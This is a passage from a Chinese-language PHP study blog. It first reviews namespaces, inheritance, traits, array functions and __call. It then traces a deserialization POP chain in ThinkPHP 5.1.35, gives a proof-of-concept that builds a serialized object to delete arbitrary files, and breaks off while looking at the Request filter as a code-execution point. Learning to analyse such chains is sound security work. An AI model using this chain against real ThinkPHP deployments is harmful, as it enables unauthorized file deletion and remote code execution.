<span class="token keyword">echo</span> <span class="token function">constant</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'my\name\MYCONST'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//两个一样</span>
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="2、继承类extend"><a href="#2、继承类extend" class="headerlink" title="2、继承类extend"></a>2、继承类<code>extend</code></h3><h5 id="（1）当扩展一个类，子类就会继承父类所有-public-和-protected-的方法，属性和常量。除非子类覆盖了父类的方法，被继承的方法都会保留其原有功能。"><a href="#（1）当扩展一个类，子类就会继承父类所有-public-和-protected-的方法，属性和常量。除非子类覆盖了父类的方法，被继承的方法都会保留其原有功能。" class="headerlink" title="（1）当扩展一个类，子类就会继承父类所有 public 和 protected 的方法，属性和常量。除非子类覆盖了父类的方法，被继承的方法都会保留其原有功能。"></a>（1）当扩展一个类，子类就会继承父类所有 public 和 protected 的方法，属性和常量。除非子类覆盖了父类的方法，被继承的方法都会保留其原有功能。</h5><h5 id="（2）子类无法访问父类的私有方法。"><a href="#（2）子类无法访问父类的私有方法。" class="headerlink" title="（2）子类无法访问父类的私有方法。"></a>（2）子类无法访问父类的私有方法。</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Foo</span><span class="token punctuation">&#123;</span>  
     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">printItem</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    
         <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Foo: '</span> <span class="token operator">.</span> <span class="token variable">$string</span> <span class="token operator">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span>    
     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">printPHP</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    
         <span class="token keyword">echo</span> <span class="token string single-quoted-string">'PHP is great.'</span> <span class="token operator">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Bar</span> <span class="token keyword">extends</span> <span class="token class-name">Foo</span><span class="token punctuation">&#123;</span>  
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">printItem</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Bar: '</span> <span class="token operator">.</span> <span class="token variable">$string</span> <span class="token operator">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$foo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$bar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$foo</span><span class="token operator">-></span><span class="token function">printItem</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'baz'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出: 'Foo: baz'</span>
<span class="token variable">$foo</span><span class="token operator">-></span><span class="token function">printPHP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 输出: 'PHP is great' </span>
<span class="token variable">$bar</span><span class="token operator">-></span><span class="token function">printItem</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'baz'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出: 'Bar: baz'</span>
<span class="token variable">$bar</span><span class="token operator">-></span><span class="token function">printPHP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 输出: 'PHP is great'</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这个例子中，子类Bar继承了父类Foo，保留了父类的函数，同时在命名冲突的情况下，覆盖了父类的方法</p>
<h3 id="3、trait-和-class"><a href="#3、trait-和-class" class="headerlink" title="3、trait 和 class"></a>3、trait 和 class</h3><h5 id="（1）trait的使用"><a href="#（1）trait的使用" class="headerlink" title="（1）trait的使用"></a>（1）<code>trait</code>的使用</h5><p><strong>使用<code>trait</code>要用<code>use</code></strong></p>
<p>自 PHP 5.4.0 起，PHP 实现了一种代码复用的方法，称为 <code>trait</code>。通过在类中使用<code>use</code> 关键字，声明要组合的Trait名称。所以，这里类的继承要使用<code>use</code>关键字</p>
<h5 id="（2）trait不能实例化"><a href="#（2）trait不能实例化" class="headerlink" title="（2）trait不能实例化"></a>（2）<code>trait</code>不能实例化</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">trait</span> <span class="token class-name-definition class-name">zx</span><span class="token punctuation">&#123;</span>
    <span class="token comment">//    const sss = 9;  //不能使用const</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">tt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'tt'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">yy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'yy'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
	
<span class="token keyword">class</span> <span class="token class-name-definition class-name">uu</span><span class="token punctuation">&#123;</span>
    
    <span class="token keyword">use</span> <span class="token package">zx</span><span class="token punctuation">;</span>  <span class="token comment">//trait 的使用</span>
    
    <span class="token keyword">const</span> <span class="token constant">rr</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">ty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'ty'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">yu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'yu'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token class-name static-context">uu</span><span class="token operator">::</span><span class="token function">tt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//输出tt  static</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>
<span class="token class-name static-context">uu</span><span class="token operator">::</span><span class="token function">ty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//输出ty   static</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>
<span class="token variable">$u</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">uu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$u</span><span class="token operator">-></span><span class="token function">yu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//输出yu  </span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>
<span class="token variable">$u</span><span class="token operator">-></span><span class="token function">yy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//输出yy</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="4、array-unshift-函数-和-array-key-exist-函数"><a href="#4、array-unshift-函数-和-array-key-exist-函数" class="headerlink" title="4、array_unshift()函数 和 array_key_exist()函数"></a>4、array_unshift()函数 和 array_key_exist()函数</h3><h5 id="（1）array-unshift"><a href="#（1）array-unshift" class="headerlink" title="（1）array_unshift()"></a>（1）array_unshift()</h5><p>在数组开头插入一个或多个单元</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$queue</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"orange"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"banana"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">array_unshift</span><span class="token punctuation">(</span><span class="token variable">$queue</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"apple"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"raspberry"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$queue</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//$queue=array("apple","rasberry","orange","banana")</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>数组中的所有数字键名会被重新排序（包括字符串数字）</p>
<p>例如： [0] [1] [q] [2]</p>
<p>字符键名保持不变</p>
<h5 id="（2）array-key-exist"><a href="#（2）array-key-exist" class="headerlink" title="（2）array_key_exist()"></a>（2）array_key_exist()</h5><p>判断数组的键是否存在，返回bool</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Volvo"</span><span class="token operator">=></span><span class="token string double-quoted-string">"XC90"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"BMW"</span><span class="token operator">=></span><span class="token string double-quoted-string">"X5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Volvo"</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"键存在！"</span><span class="token punctuation">;</span>   <span class="token comment">//输出键存在</span>
  <span class="token punctuation">&#125;</span>
<span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"键不存在！"</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="5、-call方法"><a href="#5、-call方法" class="headerlink" title="5、__call方法"></a>5、<code>__call</code>方法</h3><p>该方法有两个参数,<code>__call($name,$args)</code></p>
<p><code>$name</code>就是方法名</p>
<p>$args`就是方法参数，返回值为数组</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">st</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token function">qwe</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//不存在该方法</span>
<span class="token comment">//$name=qwe</span>
<span class="token comment">//$args=[1,2]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="三、反序列化pop链挖掘"><a href="#三、反序列化pop链挖掘" class="headerlink" title="三、反序列化pop链挖掘"></a>三、反序列化pop链挖掘</h2><p><code>本次以学习思路为主，主要跟着教程一起做</code></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43380549/article/details/101265818">https://blog.csdn.net/qq_43380549/article/details/101265818</a></p>
<h3 id="1、漏洞挖掘思路"><a href="#1、漏洞挖掘思路" class="headerlink" title="1、漏洞挖掘思路"></a>1、漏洞挖掘思路</h3><p>基本上接触到的反序列化漏洞都是利用魔术方法，魔术方法的调用导致一个类可以调用另一个类</p>
<p>以至于产生漏洞。</p>
<p>魔术方法：</p>
<p>比如：<code>__destruct</code>  <code>__tostring</code> <code>__call</code> <code>__construct</code>等等</p>
<p><code>__destruct</code> 在一个函数的调用结束后，便会执行，从这开始应该更好利用</p>
<h3 id="2、漏洞分析"><a href="#2、漏洞分析" class="headerlink" title="2、漏洞分析"></a>2、漏洞分析</h3><h5 id="（1）搜寻-destruct方法"><a href="#（1）搜寻-destruct方法" class="headerlink" title="（1）搜寻__destruct方法"></a>（1）搜寻<code>__destruct</code>方法</h5><p><img src="/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/image-20211229192627402.png" alt="image-20211229192627402" loading="lazy"></p>
<p>四个方法中，只有在<code>/thinkphp/library/think/process/pipes/Windows.php</code>中的方法有多余的调用，其他三个都是结束进程</p>
<p>我们以他为起点，开始挖掘；跟进<code>removeFiles()</code>函数</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Windows</span> <span class="token keyword">extends</span> <span class="token class-name">Pipes</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">removeFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token keyword">as</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>代码逻辑是 遍历<code>$this-&gt;files</code>数组中的文件，若存在就删除</p>
<p>而<strong>参数<code>$files</code>是可控的</strong>,那么我们就可以 造成任意文件删除漏洞</p>
<p>POC构造：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Pipes</span><span class="token punctuation">&#123;</span>
    
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Windows</span> <span class="token keyword">extends</span> <span class="token class-name">Pipes</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'想要删除文件的路径'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="（2）接下来，就要找注入点"><a href="#（2）接下来，就要找注入点" class="headerlink" title="（2）接下来，就要找注入点"></a>（2）接下来，就要找注入点</h5><p>在<code>removeFile()</code>函数中，调用了一个<code>file_exists($filename)</code></p>
<p>这个函数会将<code>$filename</code>当做字符串来处理</p>
<p>若我们<code>$filename</code>传入一个类，就会触发类中的<code>__toString</code>方法</p>
<p>因此，全局搜索<code>__toString</code>,<code>Conversion.php</code>中调用了一个该方法，该方法又调用了<code>toJson()</code></p>
<p><img src="/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/image-20220103194714402.png" alt="image-20220103194714402" loading="lazy"></p>
<p>跟进<code>toJson()</code></p>
<p><img src="/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/image-20220103195108475.png" alt="image-20220103195108475" loading="lazy"></p>
<p>其中又调用了<code>toArray()</code>,跟进<code>toArray()</code></p>
<p>我们需要在<code>toArray()</code>函数中寻找一个满足<code>$可控变量-&gt;方法(参数可控)的</code>点</p>
<p>这样在调用<code>__toString</code>方法时，就能调用我们控制的方法</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">trait</span> <span class="token class-name-definition class-name">Conversion</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token operator">...</span><span class="token operator">...</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$item</span>    <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$visible</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$hidden</span>  <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token operator">...</span><span class="token operator">...</span>
        <span class="token comment">// 追加属性（必须定义获取器）</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">append</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">append</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        <span class="token comment">// 追加关联对象属性</span>
                        <span class="token variable">$relation</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getRelation</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$relation</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                            <span class="token variable">$relation</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getAttr</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                            <span class="token variable">$relation</span><span class="token operator">-></span><span class="token function">visible</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">&#125;</span>
                        <span class="token operator">...</span><span class="token operator">...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在<code>toArray()</code>中，</p>
<p><strong><code>$relation=$this-&gt;getRelation($key);</code></strong></p>
<p>跟进<code>getRelation()</code>,它位于<code>Attribute</code>类中</p>
<p><strong>参数<code>$key</code>由<code>$append</code>控制</strong></p>
<p><img src="/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/image-20220103195539703.png" alt="image-20220103195539703" loading="lazy"></p>
<p>但是在这句的后面<code>if (!$relation)</code>,那么这个函数直接让它返回空就好了</p>
<p>跟进<code>getAttr()</code></p>
<p><img src="/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/image-20220103195806165.png" alt="image-20220103195806165" loading="lazy"></p>
<p>跟进<code>getData()</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">trait</span> <span class="token class-name-definition class-name">Attribute</span>
<span class="token punctuation">&#123;</span>
	<span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token operator">...</span><span class="token operator">...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/image-20220103195853903.png" alt="image-20220103195853903" loading="lazy"></p>
<p>到这能观察到，**<code>$relation</code>的值就是<code>$this-&gt;data[$name]</code>**</p>
<p>由于是<code>trait</code>类，继承需要用到<code>use</code>,那么需要找到一个子类，同时继承<code>Attribute</code>和<code>Conversion</code></p>
<h5 id="（3）全局搜索use"><a href="#（3）全局搜索use" class="headerlink" title="（3）全局搜索use"></a>（3）全局搜索<code>use</code></h5><p>在<code>Model.php</code>找到了一个类</p>
<p><img src="/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/image-20220104101318047.png" alt="image-20220104101318047" loading="lazy"></p>
<p>梳理一下目前需要控制的参数：</p>
<p>1.<code>$files</code>位于<code>Windows.php</code>的类<code>Windows</code></p>
<p>2.<code>$append</code>位于<code>Conversion.php</code>的类<code>Conversion</code></p>
<p>3.<code>$data</code>位于<code>Attribute.php</code>的类<code>Attribute</code></p>
<p><strong>利用链如下：</strong></p>
<p><strong>Start</strong>    —&gt;    <strong>Windows-&gt;__destruct()</strong>    —&gt;    <strong>Windows-&gt;removeFiles()</strong>    —&gt;    <strong>file_exists()</strong>    —&gt;</p>
<p><strong>Model-&gt;__toString()</strong>    —&gt;    <strong>Model-&gt;toJson()</strong>    —&gt;    <strong>Model-&gt;toArray()</strong></p>
<h3 id="3、代码执行点分析"><a href="#3、代码执行点分析" class="headerlink" title="3、代码执行点分析"></a>3、代码执行点分析</h3><p><strong>第二步，找到了我们可以控制的方法:</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$relation</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getAttr</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//`$relation`的值就是`$this->data[$name]`</span>
<span class="token variable">$relation</span><span class="token operator">-></span><span class="token function">visible</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>并且<code>$data</code>和<code>$name(就是$append数组的值，也是一个数组)</code>都可控,这样让<code>$relation</code>等于一个类,来满足下一条语句</p>
<p>接下来就要找到代码执行的点，而且类中不能有<code>visible</code>方法</p>
<p>所以要寻找<code>__call</code>方法，因为这个方法经常包含<code>call_user_func()</code>或<code>call_user_func__array()</code></p>
<p>这两个函数就能造成任意代码执行</p>
<p><code>__call</code>方法，在调用了类中不存在的方法后会触发，全局搜索后，在<code>Request.php</code>中找到</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Request</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$hook</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token operator">...</span><span class="token operator">...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/image-20220104135558150.png" alt="image-20220104135558150" loading="lazy"></p>
<p>这里的<code>$args</code>是可控的，<code>$hook</code>也是可控的，<code>$method=visible</code></p>
<p>那么就可以构造<code>$hook</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$hook</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'visible'</span><span class="token operator">=></span><span class="token string single-quoted-string">'method'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>“但是<code>array_unshift()</code>向数组插入新元素时会将新数组的值将被插入到数组的开头。这种情况下我们是构造不出可用的payload的。”</p>
<p><strong>（这里我不是很理解，虽然数组插入了新元素，但是 [‘visible’=&gt;’method’] 还是我们控制的，$args也是我们控制的，这样函数不是就能执行了吗？）</strong></p>
<p><strong>更新：</strong></p>
<p><strong>我的理解：因为$args是被插入的数组，而$args是call_user_func_array()的参数，元素插入之后，参数变多，就无法执行了</strong></p>
<p>在Thinkphp的Request类中还有一个功能<code>filter</code>功能，事实上Thinkphp多个RCE都与这个功能有关。我们可以尝试覆盖<code>filter</code>的方法去执行代码。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">input</span><span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$default</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">,</span> <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant boolean">false</span> <span class="token operator">===</span> <span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 获取原始数据</span>
        <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
